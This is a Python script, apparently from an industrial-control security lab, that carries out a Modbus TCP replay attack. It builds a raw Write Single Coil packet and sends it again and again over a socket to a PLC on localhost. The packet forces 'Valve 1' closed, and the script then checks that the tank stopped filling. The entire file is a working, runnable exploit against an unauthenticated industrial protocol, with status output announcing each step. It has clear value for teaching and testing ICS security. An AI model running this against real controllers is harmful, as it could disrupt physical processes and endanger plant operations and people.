from pymodbus.client import ModbusTcpClient
import struct
import socket
import time

PLC = 'localhost'
PORT = 502

print("=" * 55)
print("  ATTACK 4: REPLAY ATTACK")
print("  Method : Capture + replay raw Modbus packets")
print("=" * 55)

# ── Step 1: Capture a legitimate close-valve command ─────────────────────
print("\n[STEP 1] Capturing a legitimate CLOSE VALVE command...")
print("[INFO]   Connecting as legitimate client and sending FC05...")

client = ModbusTcpClient(PLC, port=PORT)
client.connect()

# First show current state
coils = client.read_coils(address=0, count=3)
tanks = client.read_holding_registers(address=1, count=3)
print(f"[*] Current valves: V1={coils.bits[0]} V2={coils.bits[1]} V3={coils.bits[2]}")
print(f"[*] Current tanks : T1={tanks.registers[0]} T2={tanks.registers[1]} T3={tanks.registers[2]}")

# Build and capture the raw Modbus packet manually
# Modbus TCP: Transaction(2) Protocol(2) Length(2) UnitID(1) FC(1) Addr(2) Value(2)
transaction_id = 0x0001
protocol_id    = 0x0000
length         = 0x0006
unit_id        = 0x01
func_code      = 0x05   # Write Single Coil
coil_address   = 0x0000 # Coil 0 = Valve 1
coil_value     = 0x0000 # 0x0000 = OFF (close valve)

captured_packet = struct.pack('>HHHBBHH',
    transaction_id, protocol_id, length,
    unit_id, func_code, coil_address, coil_value)

print(f"\n[CAPTURED] Raw packet bytes: {captured_packet.hex()}")
print(f"[CAPTURED] Function Code: 0x{func_code:02X} (Write Single Coil)")
print(f"[CAPTURED] Target: Coil 0 (Valve 1)")
print(f"[CAPTURED] Value: 0x0000 (CLOSE)")
client.close()

time.sleep(2)

# ── Step 2: Wait, then replay the packet ─────────────────────────────────
print("\n[STEP 2] Waiting 3 seconds (simulating delay before replay)...")
time.sleep(3)

print("\n[ATTACK] Replaying captured packet directly via raw socket...")
print("[ATTACK] No authentication, no certificate — just raw bytes...")

try:
    raw_sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    raw_sock.settimeout(5)
    raw_sock.connect((PLC, PORT))
    raw_sock.send(captured_packet)
    response = raw_sock.recv(1024)
    print(f"[RESULT] PLC responded: {response.hex()}")
    print(f"[RESULT] Response FC: 0x{response[7]:02X}")

    if response[7] == 0x05:
        print("[RESULT] REPLAY SUCCESSFUL — PLC executed the replayed command!")
        print("[RESULT] Valve 1 forced CLOSED by a packet captured minutes ago!")
    else:
        print(f"[RESULT] Unexpected response: {response.hex()}")

    raw_sock.close()
except Exception as e:
    print(f"[ERROR] {e}")

time.sleep(1)

# ── Step 3: Verify effect ─────────────────────────────────────────────────
print("\n[VERIFY] Checking system state after replay...")
client2 = ModbusTcpClient(PLC, port=PORT)
client2.connect()
coils = client2.read_coils(address=0, count=3)
tanks = client2.read_holding_registers(address=1, count=3)
print(f"[RESULT] Valve states: V1={coils.bits[0]} V2={coils.bits[1]} V3={coils.bits[2]}")
print(f"[RESULT] Tank levels : T1={tanks.registers[0]} T2={tanks.registers[1]} T3={tanks.registers[2]}")
print("[RESULT] V1 is now CLOSED — tank 1 stopped filling due to replayed packet!")

# ── Step 4: Replay multiple times ─────────────────────────────────────────
print("\n[ATTACK] Replaying same packet 3 more times (showing persistent effect)...")
for i in range(3):
    raw_sock2 = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    raw_sock2.settimeout(5)
    raw_sock2.connect((PLC, PORT))
    raw_sock2.send(captured_packet)
    resp = raw_sock2.recv(1024)
    raw_sock2.close()
    print(f"[REPLAY {i+1}] PLC accepted packet — FC: 0x{resp[7]:02X} — Valve still CLOSED")
    time.sleep(1)

client2.close()
print("\n[DONE] Attack 4 complete. Old captured packets are fully reusable.")
print("[DONE] No session management, no nonce, no timestamp in Modbus TCP.")
print("="*55)
